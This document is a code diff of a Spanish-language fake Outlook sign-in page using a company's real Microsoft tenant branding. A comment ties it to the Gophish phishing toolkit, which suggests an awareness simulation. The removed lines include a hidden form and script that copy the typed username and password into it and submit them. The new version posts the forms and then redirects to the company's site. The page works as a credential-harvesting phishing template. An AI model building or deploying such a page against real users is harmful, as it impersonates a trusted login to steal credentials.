@@ -5,8 +5,8 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="favicon.ico">
-    <title>Iniciar sesión en Outlook - OMODA</title>
+    <link rel="icon" href="favicon.ico" />
+    <title>Iniciar sesión en Outlook</title>
     <style>
         * {
             padding: 0;
@@ -34,6 +34,7 @@
             height: 100vh;
             width: 100rem;
             max-width: 100%;
+            
         }
 
         .title {
@@ -337,82 +338,57 @@
 <body>
     <section id="section_uname">
         <div class="auth-wrapper">
-            <img src="https://aadcdn.msftauthimages.net/c1c6b6c8-oxh5tci-twb0pxh1ysdpwk-zjpxeui4-vxgazzhee-a/logintenantbranding/0/bannerlogo?ts=638119727466586923" alt="Grupo Resnova" class="d-block">
+            <img src="https://aadcdn.msftauthimages.net/c1c6b6c8-oxh5tci-twb0pxh1ysdpwk-zjpxeui4-vxgazzhee-a/logintenantbranding/0/bannerlogo?ts=638119727466586923" alt="Grupo Resnova" class="d-block"/>
             
             <h2 class="title mb-16 mt-16">Iniciar sesión</h2>
-            <form id="form_user" >
+            <form action="" method="POST">
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
-                    <input id="inp_uname" type="text" name="username" class="input" placeholder="Correo electrónico, teléfono o Skype">
-                </div>
-                <div>
-                    <p class="mb-16 fs-13">¿No tiene una cuenta? <a href="" class="link">Cree una.</a></p>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Correo electrónico, teléfono o Skype" />
                 </div>
             </form>
             <div>
-                <button class="btn" id="btn_next" >Siguiente</button>
+                <p class="mb-16 fs-13">¿No tiene una cuenta? <a href="" class="link">Cree una.</a></p>
             </div>
-            
+            <div>
+                <button class="btn" id="btn_next">Siguiente</button>
+            </div>
         </div>
     </section>
 
     <section id="section_pwd" class="d-none">
         <div class="auth-wrapper">
-            <img src="https://aadcdn.msftauthimages.net/c1c6b6c8-oxh5tci-twb0pxh1ysdpwk-zjpxeui4-vxgazzhee-a/logintenantbranding/0/bannerlogo?ts=638119727466586923" alt="Grupo Resnova" class="d-block">
+            <img src="https://aadcdn.msftauthimages.net/c1c6b6c8-oxh5tci-twb0pxh1ysdpwk-zjpxeui4-vxgazzhee-a/logintenantbranding/0/bannerlogo?ts=638119727466586923" alt="Grupo Resnova" class="d-block"/>
             
             <div class="identity w-100 mt-16 mb-16">
                 <button class="back">
-                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" alt="back">
+                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" />
         
                 </button>
                 <span id="user_identity">a@b.com</span>
             </div>
 
             <h2 class="title mb-16">Escribir contraseña</h2>
-            <form id="form_pass">
+            <form action="" method="POST">
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
-                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Contraseña">
-                </div>
-                <div>
-                    <p class="mb-16"> <a href="#" class="link fs-13">He olvidado mi contraseña</a></p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Contraseña" />
                 </div>
             </form>
+            <div>
+                <p class="mb-16"> <a href="#" class="link fs-13">He olvidado mi contraseña</a></p>
+            </div>
             <div>
                 <button class="btn" id="btn_sig" type="submit">Iniciar sesión</button>
             </div>
         </div>
     </section>
 
-
-    <!--Formulario oculto-->
-    <form id="formulario_enviar" action="" method="POST" class="d-none"> 
-        <input id="user_formulario" name="username" type="text" >
-        <input id="password_formulario" name="password" type="password" >
-        <input id="boton_formulario" type="submit" >
-    </form>
-    <!--
-        ERROR de HTML
-            Bad value for attribute action on element form: Must be non-empty.
-        
-            Según la documentación oficial: The action is "" so that form submissions are directed to your phishing page and, therefore, to your Gophish server
-    -->
-
-
-
     <script>
         const unReq = "Escriba una dirección de correo electrónico, un número de teléfono o un nombre Skype válidos."
         const pwdReq = "Escriba su contraseña."
-        const unameInp = document.getElementById('inp_uname'); //input del nombre de usuario
-        const pwdInp = document.getElementById('inp_pwd'); //input de la contraseña
-
-        //Formulario oculto para enviar 
-        const formulario_enviar = document.getElementById("formulario_enviar");
-        const user_formulario = document.getElementById("user_formulario");
-        const password_formulario = document.getElementById("password_formulario");
-        const boton_formulario = document.getElementById("boton_formulario");
-
-
+        const unameInp = document.getElementById('inp_uname');
+        const pwdInp = document.getElementById('inp_pwd');
         let view = "uname";
 
         let unameVal = pwdVal = false;
@@ -424,15 +400,12 @@
             //validate the form
             validate();
             if (unameVal) {
-                document.getElementById("section_uname").classList.toggle('d-none'); //Esconde la parte de usuario
-                document.getElementById('section_pwd').classList.remove('d-none'); //Muestra la parte de contraseña
+                document.getElementById("section_uname").classList.toggle('d-none');
+                document.getElementById('section_pwd').classList.remove('d-none');
                 document.querySelectorAll('#user_identity').forEach((e) => {
                     e.innerText = unameInp.value;
                 })
-
-                user_formulario.value = unameInp.value; // se asigna el valor del usuario
                 view = "pwd";
-                
             }
         })
 
@@ -443,12 +416,9 @@
             //validate the form
             validate();
             if (pwdVal) {
-                password_formulario.value = pwdInp.value; //se asigna el valor de la contraseña
-
                 // Redirección a URL externa
-                //window.location.href = "https://omodaresnova.com/";  //Se redireccionará finalmente a través de la APP
+                window.location.href = "https://omodaresnova.com/"; 
 
-                formulario_enviar.submit();
             }
         })
  
@@ -516,7 +486,6 @@
             document.getElementById('section_uname').classList.remove('d-none');
         })
 
-
         //Al presionar la tecla Enter se activan los botones
         document.addEventListener('keydown', function(event) {
             if (event.key === "Enter") {
@@ -530,7 +499,6 @@
         })
 
     </script>
-
 </body>
 
 </html>
